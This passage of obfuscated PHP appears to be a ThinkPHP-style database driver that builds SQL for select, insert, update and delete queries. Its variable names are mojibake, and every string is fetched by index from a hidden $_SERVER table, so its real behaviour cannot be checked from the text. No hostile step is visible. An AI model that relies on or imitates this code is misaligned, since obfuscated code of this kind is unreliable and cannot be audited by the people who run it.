isset($ÙÃûì§Ô[$«Õú˛£Ò[31]][$◊≈ƒ∆∑å]) ? $ÙÃûì§Ô[$«Õú˛£Ò[31]][$◊≈ƒ∆∑å] : $ÙÃûì§Ô[$«Õú˛£Ò[31]][0], $«Õú˛£Ò[919] => isset($ÙÃûì§Ô[$«Õú˛£Ò[919]][$◊≈ƒ∆∑å]) ? $ÙÃûì§Ô[$«Õú˛£Ò[919]][$◊≈ƒ∆∑å] : $ÙÃûì§Ô[$«Õú˛£Ò[919]][0], $«Õú˛£Ò[27] => isset($ÙÃûì§Ô[$«Õú˛£Ò[27]][$◊≈ƒ∆∑å]) ? $ÙÃûì§Ô[$«Õú˛£Ò[27]][$◊≈ƒ∆∑å] : $ÙÃûì§Ô[$«Õú˛£Ò[27]][0]); return $this->connect($òÁÙôÒÆ, $◊≈ƒ∆∑å); } public function parseDSN($ôÔﬂÃƒ⁄) { $ë˛ï›ù¸ =& $_SERVER[Á≈ ä ∞]; if (empty($ôÔﬂÃƒ⁄)) { return !1; } $¸ïˆ‹Äê = parse_url($ôÔﬂÃƒ⁄); if ($¸ïˆ‹Äê[$ë˛ï›ù¸[190]]) { $¡Ω¶∏Œ± = array($ë˛ï›ù¸[964] => $¸ïˆ‹Äê[$ë˛ï›ù¸[190]], $ë˛ï›ù¸[891] => isset($¸ïˆ‹Äê[$ë˛ï›ù¸[609]]) ? $¸ïˆ‹Äê[$ë˛ï›ù¸[609]] : $ë˛ï›ù¸[22], $ë˛ï›ù¸[892] => isset($¸ïˆ‹Äê[$ë˛ï›ù¸[988]]) ? $¸ïˆ‹Äê[$ë˛ï›ù¸[988]] : $ë˛ï›ù¸[22], $ë˛ï›ù¸[889] => isset($¸ïˆ‹Äê[$ë˛ï›ù¸[191]]) ? $¸ïˆ‹Äê[$ë˛ï›ù¸[191]] : $ë˛ï›ù¸[22], $ë˛ï›ù¸[890] => isset($¸ïˆ‹Äê[$ë˛ï›ù¸[192]]) ? $¸ïˆ‹Äê[$ë˛ï›ù¸[192]] : $ë˛ï›ù¸[22], $ë˛ï›ù¸[31] => isset($¸ïˆ‹Äê[$ë˛ï›ù¸[94]]) ? substr($¸ïˆ‹Äê[$ë˛ï›ù¸[94]], 1) : $ë˛ï›ù¸[22]); } else { preg_match($ë˛ï›ù¸[989], trim($ôÔﬂÃƒ⁄), $©ôø≠˝…); $¡Ω¶∏Œ± = array($ë˛ï›ù¸[964] => $©ôø≠˝…[1], $ë˛ï›ù¸[891] => $©ôø≠˝…[2], $ë˛ï›ù¸[892] => $©ôø≠˝…[3], $ë˛ï›ù¸[889] => $©ôø≠˝…[4], $ë˛ï›ù¸[890] => $©ôø≠˝…[5], $ë˛ï›ù¸[31] => $©ôø≠˝…[6]); } $¡Ω¶∏Œ±[$ë˛ï›ù¸[919]] = $ë˛ï›ù¸[22]; return $¡Ω¶∏Œ±; } protected function debug() { $ƒ©»‰Ÿæ =& $_SERVER[Á≈ ä ∞]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ƒ©»‰Ÿæ[990]; if (think_config($ƒ©»‰Ÿæ[991])) { think_status($ƒ©»‰Ÿæ[992]); think_trace($this->queryStr . $ƒ©»‰Ÿæ[993] . think_status($ƒ©»‰Ÿæ[34], $ƒ©»‰Ÿæ[992], 6) . $ƒ©»‰Ÿæ[994], $ƒ©»‰Ÿæ[22], $ƒ©»‰Ÿæ[995]); } } protected function parseLock($¿àÚ≠Æ„ = false) { $ÁØ£è†ß =& $_SERVER[Á≈ ä ∞]; if (!$¿àÚ≠Æ„) { return $ÁØ£è†ß[22]; } if ($ÁØ£è†ß[921] == $this->dbType) { return $ÁØ£è†ß[996]; } return $ÁØ£è†ß[997]; } protected function parseSet($∞‘∞÷¶•) { $å°Ö”Æ∑ =& $_SERVER[Á≈ ä ∞]; foreach ($∞‘∞÷¶• as $¥ﬂïê…á => $›ÛßÒøÕ) { if (is_array($›ÛßÒøÕ) && $å°Ö”Æ∑[306] == $›ÛßÒøÕ[0]) { $¨˜§êü∫[] = $this->parseKey($¥ﬂïê…á) . $å°Ö”Æ∑[887] . $›ÛßÒøÕ[1]; } elseif (is_scalar($›ÛßÒøÕ) || is_null($›ÛßÒøÕ)) { $¨˜§êü∫[] = $this->parseKey($¥ﬂïê…á) . $å°Ö”Æ∑[887] . $this->parseValue($›ÛßÒøÕ); } } return $å°Ö”Æ∑[998] . implode($å°Ö”Æ∑[60], $¨˜§êü∫); } protected function bindParam($∞πÂåπô, $Ò—ãÉõ˚) { $this->bind[$_SERVER[Á≈ ä ∞][4] . $∞πÂåπô] = $Ò—ãÉõ˚; } protected function parseBind($Ã´æñ—î) { $Ã´æñ—î = array_merge($this->bind, $Ã´æñ—î); $this->bind = array(); return $Ã´æñ—î; } function parseKey(&$∞≈∫Òπ≥, $Æ∑⁄Ê—õ = true) { if ($Æ∑⁄Ê—õ) { $∞≈∫Òπ≥ = $this->parseKeyCheck($∞≈∫Òπ≥); } return $∞≈∫Òπ≥; } function parseKeyCheck($å»œÛÌœ) { $”⁄“îƒÚ =& $_SERVER[Á≈ ä ∞]; $å»œÛÌœ = trim($å»œÛÌœ); if (!preg_match($”⁄“îƒÚ[999], $å»œÛÌœ)) { think_exception($”⁄“îƒÚ[1000] . $å»œÛÌœ); } return $å»œÛÌœ; } protected function parseValue($Æ”’ë„‚) { $˜¢Î˚°é =& $_SERVER[Á≈ ä ∞]; if (is_string($Æ”’ë„‚)) { $Æ”’ë„‚ = $˜¢Î˚°é[960] . $this->escapeString($Æ”’ë„‚) . $˜¢Î˚°é[960]; } elseif (isset($Æ”’ë„‚[0]) && is_string($Æ”’ë„‚[0]) && strtolower($Æ”’ë„‚[0]) == $˜¢Î˚°é[306]) { $Æ”’ë„‚ = $this->escapeString($Æ”’ë„‚[1]); } elseif (is_array($Æ”’ë„‚)) { $Æ”’ë„‚ = array_map(array($this, $˜¢Î˚°é[961]), $Æ”’ë„‚); } elseif (is_bool($Æ”’ë„‚)) { $Æ”’ë„‚ = $Æ”’ë„‚ ? $˜¢Î˚°é[98] : $˜¢Î˚°é[207]; } elseif (is_null($Æ”’ë„‚)) { $Æ”’ë„‚ = $˜¢Î˚°é[113]; } return $Æ”’ë„‚; } protected function parseField($œ®ÏêÀ ) { $˛≠†“Ï” =& $_SERVER[Á≈ ä ∞]; if (is_string($œ®ÏêÀ ) && strpos($œ®ÏêÀ , $˛≠†“Ï”[60])) { $œ®ÏêÀ  = explode($˛≠†“Ï”[60], $œ®ÏêÀ ); } if (is_array($œ®ÏêÀ )) { $¶˜Çå¯œ = array(); foreach ($œ®ÏêÀ  as $œÊ‘ÑÉÕ => $∫§ä§Â–) { if (!is_numeric($œÊ‘ÑÉÕ)) { $¶˜Çå¯œ[] = $this->parseKey($œÊ‘ÑÉÕ, !1) . $˛≠†“Ï”[1001] . $this->parseKey($∫§ä§Â–); } else { $¶˜Çå¯œ[] = $this->parseKey($∫§ä§Â–); } } $ËŒ®ÊÇ¨ = implode($˛≠†“Ï”[60], $¶˜Çå¯œ); } elseif (is_string($œ®ÏêÀ ) && !empty($œ®ÏêÀ )) { $ËŒ®ÊÇ¨ = $œ®ÏêÀ ; } else { $ËŒ®ÊÇ¨ = $˛≠†“Ï”[198]; } return $ËŒ®ÊÇ¨; } protected function parseTable($‹√ãÚ–∏) { $·»™ÃÈä =& $_SERVER[Á≈ ä ∞]; if (is_array($‹√ãÚ–∏)) { $¡≈“Çº∏ = array(); foreach ($‹√ãÚ–∏ as $âÌß™æÈ => $´ôàáãå) { if (!is_numeric($âÌß™æÈ)) { $¡≈“Çº∏[] = $this->parseKey($âÌß™æÈ) . $·»™ÃÈä[63] . $this->parseKey($´ôàáãå); } else { $¡≈“Çº∏[] = $this->parseKey($âÌß™æÈ); } } $‹√ãÚ–∏ = $¡≈“Çº∏; } elseif (is_string($‹√ãÚ–∏)) { if (strstr($‹√ãÚ–∏, $·»™ÃÈä[63])) { return $‹√ãÚ–∏; } $‹√ãÚ–∏ = explode($·»™ÃÈä[60], $‹√ãÚ–∏); array_walk($‹√ãÚ–∏, array($this, $·»™ÃÈä[909])); } return $·»™ÃÈä[903] . trim(implode($·»™ÃÈä[1002], $‹√ãÚ–∏), $·»™ÃÈä[394]) . $·»™ÃÈä[903]; } protected function parseWhere($‡ëò¥¯∑) { $èÒ◊‘¡É =& $_SERVER[Á≈ ä ∞]; $⁄Õ•Õ∂≤ = $èÒ◊‘¡É[22]; if (is_string($‡ëò¥¯∑)) { $⁄Õ•Õ∂≤ = $‡ëò¥¯∑; } else { $‘¸¶•˛ú = isset($‡ëò¥¯∑[$èÒ◊‘¡É[1003]]) ? strtoupper($‡ëò¥¯∑[$èÒ◊‘¡É[1003]]) : $èÒ◊‘¡É[22]; if (in_array($‘¸¶•˛ú, array($èÒ◊‘¡É[1004], $èÒ◊‘¡É[1005], $èÒ◊‘¡É[1006]))) { $‘¸¶•˛ú = $èÒ◊‘¡É[63] . $‘¸¶•˛ú . $èÒ◊‘¡É[63]; unset($‡ëò¥¯∑[$èÒ◊‘¡É[1003]]); } else { $‘¸¶•˛ú = $èÒ◊‘¡É[1007]; } foreach ($‡ëò¥¯∑ as $ÔÏÒ◊÷Ê => $‹€∏ÅÍ…) { $⁄Õ•Õ∂≤ .= $èÒ◊‘¡É[286]; if (is_numeric($ÔÏÒ◊÷Ê)) { $ÔÏÒ◊÷Ê = $èÒ◊‘¡É[1008]; } if (0 === strpos($ÔÏÒ◊÷Ê, $èÒ◊‘¡É[21])) { $⁄Õ•Õ∂≤ .= $this->parseThinkWhere($ÔÏÒ◊÷Ê, $‹€∏ÅÍ…); } else { if (!preg_match($èÒ◊‘¡É[1009], trim($ÔÏÒ◊÷Ê))) { think_exception(think_lang($èÒ◊‘¡É[1010]) . $èÒ◊‘¡É[4] . $ÔÏÒ◊÷Ê); } $ªÿ˙èºå = is_array($‹€∏ÅÍ…) && isset($‹€∏ÅÍ…[$èÒ◊‘¡É[1011]]); $ÔÏÒ◊÷Ê = trim($ÔÏÒ◊÷Ê); if (strpos($ÔÏÒ◊÷Ê, $èÒ◊‘¡É[292])) { $î›Ù˛–é = explode($èÒ◊‘¡É[292], $ÔÏÒ◊÷Ê); $⁄àí⁄◊Ê = array(); foreach ($î›Ù˛–é as $Ü¬¨ºé¸ => $ØÃÌ´¥¸) { $‚É©Ì£— = $ªÿ˙èºå ? $‹€∏ÅÍ…[$Ü¬¨ºé¸] : $‹€∏ÅÍ…; $⁄àí⁄◊Ê[] = $èÒ◊‘¡É[269] . $this->parseWhereItem($this->parseKey($ØÃÌ´¥¸), $‚É©Ì£—) . $èÒ◊‘¡É[908]; } $⁄Õ•Õ∂≤ .= implode($èÒ◊‘¡É[1012], $⁄àí⁄◊Ê); } elseif (strpos($ÔÏÒ◊÷Ê, $èÒ◊‘¡É[293])) { $î›Ù˛–é = explode($èÒ◊‘¡É[293], $ÔÏÒ◊÷Ê); $⁄àí⁄◊Ê = array(); foreach ($î›Ù˛–é as $Ü¬¨ºé¸ => $ØÃÌ´¥¸) { $‚É©Ì£— = $ªÿ˙èºå ? $‹€∏ÅÍ…[$Ü¬¨ºé¸] : $‹€∏ÅÍ…; $⁄àí⁄◊Ê[] = $èÒ◊‘¡É[269] . $this->parseWhereItem($this->parseKey($ØÃÌ´¥¸), $‚É©Ì£—) . $èÒ◊‘¡É[908]; } $⁄Õ•Õ∂≤ .= implode($èÒ◊‘¡É[1007], $⁄àí⁄◊Ê); } else { $⁄Õ•Õ∂≤ .= $this->parseWhereItem($this->parseKey($ÔÏÒ◊÷Ê), $‹€∏ÅÍ…); } } $⁄Õ•Õ∂≤ .= $èÒ◊‘¡É[287] . $‘¸¶•˛ú; } $⁄Õ•Õ∂≤ = substr($⁄Õ•Õ∂≤, 0, -strlen($‘¸¶•˛ú)); } return empty($⁄Õ•Õ∂≤) ? $èÒ◊‘¡É[22] : $èÒ◊‘¡É[1013] . $⁄Õ•Õ∂≤; } protected function parseWhereItem($íπùÒ√“, $◊ﬂæÑ¡€) { $à°ﬁ”∏¨ =& $_SERVER[Á≈ ä ∞]; $ÖüôåÇ• = $à°ﬁ”∏¨[22]; if (is_array($◊ﬂæÑ¡€)) { if (is_string($◊ﬂæÑ¡€[0])) { $ÎÍ””»’ = strtolower($◊ﬂæÑ¡€[0]); if (in_array($◊ﬂæÑ¡€[0], array($à°ﬁ”∏¨[887], $à°ﬁ”∏¨[1014], $à°ﬁ”∏¨[1015], $à°ﬁ”∏¨[1016], $à°ﬁ”∏¨[1017], $à°ﬁ”∏¨[1018]))) { $ÖüôåÇ• .= $íπùÒ√“ . $à°ﬁ”∏¨[63] . $◊ﬂæÑ¡€[0] . $à°ﬁ”∏¨[63] . $this->parseValue($◊ﬂæÑ¡€[1]); } elseif (preg_match($à°ﬁ”∏¨[1019], $◊ﬂæÑ¡€[0])) { $ÖüôåÇ• .= $íπùÒ√“ . $à°ﬁ”∏¨[63] . $this->exp[$ÎÍ””»’] . $à°ﬁ”∏¨[63] . $this->parseValue($◊ﬂæÑ¡€[1]); } elseif (preg_match($à°ﬁ”∏¨[1020], $◊ﬂæÑ¡€[0])) { if (is_array($◊ﬂæÑ¡€[1])) { $àœ–±´® = isset($◊ﬂæÑ¡€[2]) ? strtoupper($◊ﬂæÑ¡€[2]) : $à°ﬁ”∏¨[1005]; if (in_array($àœ–±´®, array($à°ﬁ”∏¨[1004], $à°ﬁ”∏¨[1005], $à°ﬁ”∏¨[1006]))) { $”èãÈóÖ = array(); foreach ($◊ﬂæÑ¡€[1] as $ì¶Ô˙ç†) { $”èãÈóÖ[] = $íπùÒ√“ . $à°ﬁ”∏¨[63] . $this->exp[$ÎÍ””»’] . $à°ﬁ”∏¨[63] . $this->parseValue($ì¶Ô˙ç†); } $ÖüôåÇ• .= $à°ﬁ”∏¨[269] . implode($à°ﬁ”∏¨[63] . $àœ–±´® . $à°ﬁ”∏¨[63], $”èãÈóÖ) . $à°ﬁ”∏¨[908]; } } else { $ÖüôåÇ• .= $íπùÒ√“ . $à°ﬁ”∏¨[63] . $this->exp[$ÎÍ””»’] . $à°ﬁ”∏¨[63] . $this->parseValue($◊ﬂæÑ¡€[1]); } } elseif ($à°ﬁ”∏¨[306] == $ÎÍ””»’) { $ÖüôåÇ• .= $à°ﬁ”∏¨[906] . $íπùÒ√“ . $à°ﬁ”∏¨[63] . $◊ﬂæÑ¡€[1] . $à°ﬁ”∏¨[1021]; } elseif (preg_match($à°ﬁ”∏¨[1022], $◊ﬂæÑ¡€[0])) { $ÖüôåÇ• .= $◊ﬂæÑ¡€[0]; } elseif (preg_match($à°ﬁ”∏¨[1023], $◊ﬂæÑ¡€[0])) { if (isset($◊ﬂæÑ¡€[2]) && $à°ﬁ”∏¨[306] == $◊ﬂæÑ¡€[2]) { $ÖüôåÇ• .= $íπùÒ√“ . $à°ﬁ”∏¨[63] . $this->exp[$ÎÍ””»’] . $à°ﬁ”∏¨[63] . $◊ﬂæÑ¡€[1]; } else { if (is_string($◊ﬂæÑ¡€[1])) { $◊ﬂæÑ¡€[1] = explode($à°ﬁ”∏¨[60], $◊ﬂæÑ¡€[1]); } $´Ü¨ÒÔè = implode($à°ﬁ”∏¨[60], $this->parseValue($◊ﬂæÑ¡€[1])); $ÖüôåÇ• .= $íπùÒ√“ . $à°ﬁ”∏¨[63] . $this->exp[$ÎÍ””»’] . $à°ﬁ”∏¨[906] . $´Ü¨ÒÔè . $à°ﬁ”∏¨[908]; } } elseif (preg_match($à°ﬁ”∏¨[1024], $◊ﬂæÑ¡€[0])) { $›¥˙ûä = is_string($◊ﬂæÑ¡€[1]) ? explode($à°ﬁ”∏¨[60], $◊ﬂæÑ¡€[1]) : $◊ﬂæÑ¡€[1]; $ÖüôåÇ• .= $à°ﬁ”∏¨[906] . $íπùÒ√“ . $à°ﬁ”∏¨[63] . $this->exp[$ÎÍ””»’] . $à°ﬁ”∏¨[63] . $this->parseValue($›¥˙ûä[0]) . $à°ﬁ”∏¨[1007] . $this->parseValue($›¥˙ûä[1]) . $à°ﬁ”∏¨[287]; } else { think_exception(think_lang($à°ﬁ”∏¨[1010]) . $à°ﬁ”∏¨[4] . $◊ﬂæÑ¡€[0]); } } else { $ê´‘ìë¡ = count($◊ﬂæÑ¡€); $Ö˘ÇÉÌ› = $à°ﬁ”∏¨[22]; if (is_string($◊ﬂæÑ¡€[$ê´‘ìë¡ - 1])) { $Ö˘ÇÉÌ› = isset($◊ﬂæÑ¡€[$ê´‘ìë¡ - 1]) ? strtoupper($◊ﬂæÑ¡€[$ê´‘ìë¡ - 1]) : $à°ﬁ”∏¨[22]; if (in_array($Ö˘ÇÉÌ›, array($à°ﬁ”∏¨[1004], $à°ﬁ”∏¨[1005], $à°ﬁ”∏¨[1006]))) { $ê´‘ìë¡ = $ê´‘ìë¡ - 1; } } else { $Ö˘ÇÉÌ› = $à°ﬁ”∏¨[1004]; } for ($ö£≥Ç‘Œ = 0; $ö£≥Ç‘Œ < $ê´‘ìë¡; $ö£≥Ç‘Œ++) { $›¥˙ûä = is_array($◊ﬂæÑ¡€[$ö£≥Ç‘Œ]) ? $◊ﬂæÑ¡€[$ö£≥Ç‘Œ][1] : $◊ﬂæÑ¡€[$ö£≥Ç‘Œ]; if ($à°ﬁ”∏¨[306] == strtolower($◊ﬂæÑ¡€[$ö£≥Ç‘Œ][0])) { $ÖüôåÇ• .= $à°ﬁ”∏¨[269] . $íπùÒ√“ . $à°ﬁ”∏¨[63] . $›¥˙ûä . $à°ﬁ”∏¨[1021] . $Ö˘ÇÉÌ› . $à°ﬁ”∏¨[63]; } else { $¡µØØ—» = is_array($◊ﬂæÑ¡€[$ö£≥Ç‘Œ]) ? $this->exp[strtolower($◊ﬂæÑ¡€[$ö£≥Ç‘Œ][0])] : $à°ﬁ”∏¨[887]; if (!$¡µØØ—» && is_array($◊ﬂæÑ¡€[$ö£≥Ç‘Œ]) && in_array($◊ﬂæÑ¡€[$ö£≥Ç‘Œ][0], array($à°ﬁ”∏¨[887], $à°ﬁ”∏¨[1014], $à°ﬁ”∏¨[1015], $à°ﬁ”∏¨[1016], $à°ﬁ”∏¨[1017], $à°ﬁ”∏¨[1018]))) { $¡µØØ—» = $◊ﬂæÑ¡€[$ö£≥Ç‘Œ][0]; } $ÖüôåÇ• .= $à°ﬁ”∏¨[269] . $íπùÒ√“ . $à°ﬁ”∏¨[63] . $¡µØØ—» . $à°ﬁ”∏¨[63] . $this->parseValue($›¥˙ûä) . $à°ﬁ”∏¨[1021] . $Ö˘ÇÉÌ› . $à°ﬁ”∏¨[63]; } } $ÖüôåÇ• = substr($ÖüôåÇ•, 0, -4); } } else { $ÖüôåÇ• .= $íπùÒ√“ . $à°ﬁ”∏¨[1025] . $this->parseValue($◊ﬂæÑ¡€); } return $ÖüôåÇ•; } protected function parseThinkWhere($‘µçÕÔê, $¿âœ™éÇ) { $Úí¨»áä =& $_SERVER[Á≈ ä ∞]; $ÃŒÒ∏Êà = $Úí¨»áä[22]; switch ($‘µçÕÔê) { case $Úí¨»áä[361]: $ÃŒÒ∏Êà = $¿âœ™éÇ; break; case $Úí¨»áä[1008]: $ÃŒÒ∏Êà = is_string($¿âœ™éÇ) ? $¿âœ™éÇ : substr($this->parseWhere($¿âœ™éÇ), 6); break; case $Úí¨»áä[1026]: parse_str($¿âœ™éÇ, $ïûƒ≈ˆÅ); if (isset($ïûƒ≈ˆÅ[$Úí¨»áä[1003]])) { $áÎ Ë…∫ = $Úí¨»áä[63] . strtoupper($ïûƒ≈ˆÅ[$Úí¨»áä[1003]]) . $Úí¨»áä[63]; unset($ïûƒ≈ˆÅ[$Úí¨»áä[1003]]); } else { $áÎ Ë…∫ = $Úí¨»áä[1007]; } $ÚÀ·Ë≥≤ = array(); foreach ($ïûƒ≈ˆÅ as $à¢Ëõ¯´ => $≥¿¥ıﬁ˜) { $ÚÀ·Ë≥≤[] = $this->parseKey($à¢Ëõ¯´) . $Úí¨»áä[1025] . $this->parseValue($≥¿¥ıﬁ˜); } $ÃŒÒ∏Êà = implode($áÎ Ë…∫, $ÚÀ·Ë≥≤); break; } return $ÃŒÒ∏Êà; } protected function parseLimit($»è ôÈ¥) { $ºá˛Ω¿™ =& $_SERVER[Á≈ ä ∞]; return !empty($»è ôÈ¥) ? $ºá˛Ω¿™[61] . $»è ôÈ¥ . $ºá˛Ω¿™[63] : $ºá˛Ω¿™[22]; } protected function parseJoin($˙™»Ÿ◊‡) { $∫íÔ™Æ∆ =& $_SERVER[Á≈ ä ∞]; $†…«ª∆Ω = $∫íÔ™Æ∆[22]; if (!empty($˙™»Ÿ◊‡)) { if (is_array($˙™»Ÿ◊‡)) { foreach ($˙™»Ÿ◊‡ as $ÚõÇ≠åÃ => $ƒ ±Â≈Â) { if (!1 !== stripos($ƒ ±Â≈Â, $∫íÔ™Æ∆[1027])) { $†…«ª∆Ω .= $∫íÔ™Æ∆[63] . $ƒ ±Â≈Â; } else { $†…«ª∆Ω .= $∫íÔ™Æ∆[1028] . $ƒ ±Â≈Â; } } } else { $†…«ª∆Ω .= $∫íÔ™Æ∆[1028] . $˙™»Ÿ◊‡; } } $†…«ª∆Ω = preg_replace($∫íÔ™Æ∆[1029], think_config($∫íÔ™Æ∆[933]) . $∫íÔ™Æ∆[1030], $†…«ª∆Ω); return $†…«ª∆Ω; } protected function parseOrder($ñ≈›◊âã) { $è∫≥ÃÔõ =& $_SERVER[Á≈ ä ∞]; if (is_array($ñ≈›◊âã)) { $©˘´’∞â = array(); foreach ($ñ≈›◊âã as $‹Ëæß‘™ => $Åò„≈Å“) { if (is_numeric($‹Ëæß‘™)) { $©˘´’∞â[] = $this->parseKey($Åò„≈Å“); } else { $Åò„≈Å“ = in_array(strtoupper(trim($Åò„≈Å“)), array($è∫≥ÃÔõ[1031], $è∫≥ÃÔõ[1032])) ? $è∫≥ÃÔõ[63] . $Åò„≈Å“ : $è∫≥ÃÔõ[22]; if (preg_match($è∫≥ÃÔõ[1033], $‹Ëæß‘™)) { $©˘´’∞â[] = $this->parseKey($‹Ëæß‘™) . $Åò„≈Å“; } else { think_exception($è∫≥ÃÔõ[1034] . $‹Ëæß‘™); } } } $ñ≈›◊âã = implode($è∫≥ÃÔõ[60], $©˘´’∞â); } return !empty($ñ≈›◊âã) ? $è∫≥ÃÔõ[1035] . $ñ≈›◊âã : $è∫≥ÃÔõ[22]; } protected function parseGroup($µ¡¥“ﬁÛ) { $Õ˛Ãº⁄™ =& $_SERVER[Á≈ ä ∞]; return !empty($µ¡¥“ﬁÛ) ? $Õ˛Ãº⁄™[1036] . $µ¡¥“ﬁÛ : $Õ˛Ãº⁄™[22]; } protected function parseHaving($Ôí∏¥Õ˚) { $◊˚Ï∑ÕÛ =& $_SERVER[Á≈ ä ∞]; return !empty($Ôí∏¥Õ˚) ? $◊˚Ï∑ÕÛ[1037] . $Ôí∏¥Õ˚ : $◊˚Ï∑ÕÛ[22]; } protected function parseComment($öÔ≈Àòú) { $≥ñ∆—˝¯ =& $_SERVER[Á≈ ä ∞]; return !empty($öÔ≈Àòú) ? $≥ñ∆—˝¯[1038] . $öÔ≈Àòú . $≥ñ∆—˝¯[1039] : $≥ñ∆—˝¯[22]; } protected function parseDistinct($Ããæœ⁄Ü) { $Â„ç‡Ú’ =& $_SERVER[Á≈ ä ∞]; return !empty($Ããæœ⁄Ü) ? $Â„ç‡Ú’[1040] : $Â„ç‡Ú’[22]; } protected function parseUnion($¸ À»Ñ©) { $»´¨˝Î˙ =& $_SERVER[Á≈ ä ∞]; if (empty($¸ À»Ñ©)) { return $»´¨˝Î˙[22]; } if (isset($¸ À»Ñ©[$»´¨˝Î˙[357]])) { $æ†”åÑ¯ = $»´¨˝Î˙[1041]; unset($¸ À»Ñ©[$»´¨˝Î˙[357]]); } else { $æ†”åÑ¯ = $»´¨˝Î˙[1042]; } foreach ($¸ À»Ñ© as $≠–ü†Èì) { $Ã—Ñƒ¯Ê[] = $æ†”åÑ¯ . (is_array($≠–ü†Èì) ? $this->buildSelectSql($≠–ü†Èì) : $≠–ü†Èì); } return implode($»´¨˝Î˙[63], $Ã—Ñƒ¯Ê); } public function insert($À±ÁÑ†à, $»ÿ—–≥ç = array(), $‚•†«÷ = false) { $¯©“ñô° =& $_SERVER[Á≈ ä ∞]; $ç⁄«•Ω© = $∫É˜óÇØ = array(); $this->model = $»ÿ—–≥ç[$¯©“ñô°[290]]; foreach ($À±ÁÑ†à as $Â†ÈÇÉ· => $æ¨æ“ˆä) { if (is_array($æ¨æ“ˆä) && $¯©“ñô°[306] == $æ¨æ“ˆä[0]) { $∫É˜óÇØ[] = $this->parseKey($Â†ÈÇÉ·); $ç⁄«•Ω©[] = $æ¨æ“ˆä[1]; } elseif (is_scalar($æ¨æ“ˆä) || is_null($æ¨æ“ˆä)) { $∫É˜óÇØ[] = $this->parseKey($Â†ÈÇÉ·); $ç⁄«•Ω©[] = $this->parseValue($æ¨æ“ˆä); } } $Ë‹Ó≠ Î = ($‚•†«÷ ? $¯©“ñô°[910] : $¯©“ñô°[911]) . $¯©“ñô°[912] . $this->parseTable($»ÿ—–≥ç[$¯©“ñô°[288]]) . $¯©“ñô°[906] . implode($¯©“ñô°[60], $∫É˜óÇØ) . $¯©“ñô°[907] . implode($¯©“ñô°[60], $ç⁄«•Ω©) . $¯©“ñô°[908]; $Ë‹Ó≠ Î .= $this->parseLock(isset($»ÿ—–≥ç[$¯©“ñô°[850]]) ? $»ÿ—–≥ç[$¯©“ñô°[850]] : !1); $Ë‹Ó≠ Î .= $this->parseComment(!empty($»ÿ—–≥ç[$¯©“ñô°[363]]) ? $»ÿ—–≥ç[$¯©“ñô°[363]] : $¯©“ñô°[22]); return $this->execute($Ë‹Ó≠ Î, $this->parseBind(!empty($»ÿ—–≥ç[$¯©“ñô°[294]]) ? $»ÿ—–≥ç[$¯©“ñô°[294]] : array())); } public function selectInsert($éÛ˚ÈØÄ, $‰±Ìﬂ⁄, $üÎÎ¥¶ø = array()) { $é¶Ÿ≠ûœ =& $_SERVER[Á≈ ä ∞]; $this->model = $üÎÎ¥¶ø[$é¶Ÿ≠ûœ[290]]; if (is_string($éÛ˚ÈØÄ)) { $éÛ˚ÈØÄ = explode($é¶Ÿ≠ûœ[60], $éÛ˚ÈØÄ); } array_walk($éÛ˚ÈØÄ, array($this, $é¶Ÿ≠ûœ[909])); $’π⁄‚‘– = $é¶Ÿ≠ûœ[1043] . $this->parseTable($‰±Ìﬂ⁄) . $é¶Ÿ≠ûœ[906] . implode($é¶Ÿ≠ûœ[60], $éÛ˚ÈØÄ) . $é¶Ÿ≠ûœ[1021]; $’π⁄‚‘– .= $this->buildSelectSql($üÎÎ¥¶ø); return $this->execute($’π⁄‚‘–, $this->parseBind(!empty($üÎÎ¥¶ø[$é¶Ÿ≠ûœ[294]]) ? $üÎÎ¥¶ø[$é¶Ÿ≠ûœ[294]] : array())); } public function update($∞‚Ûê®Î, $“ò‘ÇŸ∞) { $ß∆È†ø˝ =& $_SERVER[Á≈ ä ∞]; $this->model = $“ò‘ÇŸ∞[$ß∆È†ø˝[290]]; $—ºÇ‹Ÿ• = $ß∆È†ø˝[1044] . $this->parseTable($“ò‘ÇŸ∞[$ß∆È†ø˝[288]]) . $this->parseSet($∞‚Ûê®Î) . $this->parseWhere(!empty($“ò‘ÇŸ∞[$ß∆È†ø˝[284]]) ? $“ò‘ÇŸ∞[$ß∆È†ø˝[284]] : $ß∆È†ø˝[22]) . $this->parseOrder(!empty($“ò‘ÇŸ∞[$ß∆È†ø˝[374]]) ? $“ò‘ÇŸ∞[$ß∆È†ø˝[374]] : $ß∆È†ø˝[22]) . $this->parseLimit(!empty($“ò‘ÇŸ∞[$ß∆È†ø˝[301]]) ? $“ò‘ÇŸ∞[$ß∆È†ø˝[301]] : $ß∆È†ø˝[22]) . $this->parseLock(isset($“ò‘ÇŸ∞[$ß∆È†ø˝[850]]) ? $“ò‘ÇŸ∞[$ß∆È†ø˝[850]] : !1) . $this->parseComment(!empty($“ò‘ÇŸ∞[$ß∆È†ø˝[363]]) ? $“ò‘ÇŸ∞[$ß∆È†ø˝[363]] : $ß∆È†ø˝[22]); return $this->execute($—ºÇ‹Ÿ•, $this->parseBind(!empty($“ò‘ÇŸ∞[$ß∆È†ø˝[294]]) ? $“ò‘ÇŸ∞[$ß∆È†ø˝[294]] : array())); } public function delete($ßÔüó∞Æ = array()) { $ﬂµ±ºÜˆ =& $_SERVER[Á≈ ä ∞]; $this->model = $ßÔüó∞Æ[$ﬂµ±ºÜˆ[290]]; $πÜ»›Û˚ = $ﬂµ±ºÜˆ[1045] . $this->parseTable($ßÔüó∞Æ[$ﬂµ±ºÜˆ[288]]) . $this->parseWhere(!empty($ßÔüó∞Æ[$ﬂµ±ºÜˆ[284]]) ? $ßÔüó∞Æ[$ﬂµ±ºÜˆ[284]] : $ﬂµ±ºÜˆ[22]) . $this->parseOrder(!empty($ßÔüó∞Æ[$ﬂµ±ºÜˆ[374]]) ? $ßÔüó∞Æ[$ﬂµ±ºÜˆ[374]] : $ﬂµ±ºÜˆ[22]) . $this->parseLimit(!empty($ßÔüó∞Æ[$ﬂµ±ºÜˆ[301]]) ? $ßÔüó∞Æ[$ﬂµ±ºÜˆ[301]] : $ﬂµ±ºÜˆ[22]) . $this->parseLock(isset($ßÔüó∞Æ[$ﬂµ±ºÜˆ[850]]) ? $ßÔüó∞Æ[$ﬂµ±ºÜˆ[850]] : !1) . $this->parseComment(!empty($ßÔüó∞Æ[$ﬂµ±ºÜˆ[363]]) ? $ßÔüó∞Æ[$ﬂµ±ºÜˆ[363]] : $ﬂµ±ºÜˆ[22]); return $this->execute($πÜ»›Û˚, 